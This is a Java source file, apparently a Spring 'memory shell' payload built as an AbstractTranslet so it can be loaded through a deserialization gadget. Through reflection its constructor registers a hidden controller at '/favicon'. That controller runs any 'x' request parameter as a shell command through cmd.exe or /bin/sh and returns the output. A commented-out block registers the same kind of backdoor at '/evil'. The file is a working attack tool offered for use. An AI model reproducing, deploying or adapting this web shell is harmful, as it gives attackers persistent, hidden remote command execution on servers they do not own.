import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.handler.AbstractHandlerMethodMapping;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import org.springframework.web.util.pattern.PathPatternParser;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Map;
import java.util.Scanner;

@RestController
public class MemController1 extends AbstractTranslet {
//    static {
//
//        try {
//            String inject_uri = "/evil";
//            System.out.println("Controller Injecting");
//            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.
//                    currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
//            RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
//
//            Field f = mappingHandlerMapping.getClass().getSuperclass().getSuperclass().getDeclaredField("mappingRegistry");
//            f.setAccessible(true);
//            Object mappingRegistry = f.get(mappingHandlerMapping);
//
//            Class<?> c = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry");
//
//            Method[] ms = c.getDeclaredMethods();
//
//            Field field = null;
//            try {
//                field = c.getDeclaredField("urlLookup");
//                field.setAccessible(true);
//            }catch (NoSuchFieldException e){
//                field = c.getDeclaredField("pathLookup");
//                field.setAccessible(true);
//            }
//
//            Map<String, Object> urlLookup = (Map<String, Object>) field.get(mappingRegistry);
//            for (String urlPath : urlLookup.keySet()) {
//                if (inject_uri.equals(urlPath)) {
//                    throw new Exception("already had same urlPath");
//                }
//            }
//
//            Class <?> evilClass = MSpringJNIController.class;
//
//            Method method2 = evilClass.getMethod("index");
//
//            RequestMappingInfo.BuilderConfiguration option = new RequestMappingInfo.BuilderConfiguration();
//            option.setPatternParser(new PathPatternParser());
//
//            RequestMappingInfo info = RequestMappingInfo.paths(inject_uri).options(option).build();
//
//            // 将该controller注册到Spring容器
//            mappingHandlerMapping.registerMapping(info, evilClass.newInstance(), method2);
//        }catch (Exception e){
//            e.printStackTrace();
//        }
//    }
    public MemController1() throws Exception {
        final String controllerPath = "/favicon";
        WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
        Method method = MemController1.class.getDeclaredMethod("execX");
        Field mapfield = AbstractHandlerMethodMapping.class.getDeclaredField("mappingRegistry");
        mapfield.setAccessible(true);
        Object mr = mapfield.get(r);
        Class<?> mrclazz = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry");
        Method mrms = mrclazz.getDeclaredMethod("register", Object.class, Object.class, Method.class);
        Field lookupfield = null;
        try {
            lookupfield = mrclazz.getDeclaredField("urlLookup");
            lookupfield.setAccessible(true);
        }catch (NoSuchFieldException e){
            lookupfield = mrclazz.getDeclaredField("pathLookup");
            lookupfield.setAccessible(true);
        }
        Map<String, Object> urlLookup = (Map<String, Object>) lookupfield.get(mr);
        for (String urlPath : urlLookup.keySet()) {
            if (controllerPath.equals(urlPath)) {
                throw new Exception("controller url path exist already");
            }
        }
        PatternsRequestCondition url = new PatternsRequestCondition(controllerPath);
        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
        mrms.setAccessible(true);
        // 避免进入实例创建的死循环
        MemController1 mem = new MemController1("aaa");
        mrms.invoke(mr, info, mem, method);
//        RequestMappingInfo.BuilderConfiguration option = new RequestMappingInfo.BuilderConfiguration();
//        option.setPatternParser(new PathPatternParser());
//        RequestMappingInfo info = RequestMappingInfo.paths(controllerPath).options(option).build();
//        r.registerMapping(info, mem, method);
    }

    public MemController1(String aaa){}

    public void execX() {
        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
        try {
            String arg0 = request.getParameter("x");
            PrintWriter writer = response.getWriter();
            if (arg0 != null) {
                String o = "";
                ProcessBuilder p;
                if (System.getProperty("os.name").toLowerCase().contains("win")) {
                    p = new ProcessBuilder(new String[]{"cmd.exe", "/c", arg0});
                } else {
                    p = new ProcessBuilder(new String[]{"/bin/sh", "-c", arg0});
                }

                Scanner c = (new Scanner(p.start().getInputStream())).useDelimiter("\\A");
                o = c.hasNext() ? c.next() : o;
                c.close();
                writer.write(o);
                writer.flush();
                writer.close();
            } else {
                response.sendError(404);
            }
        } catch (Exception var8) {
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }
}
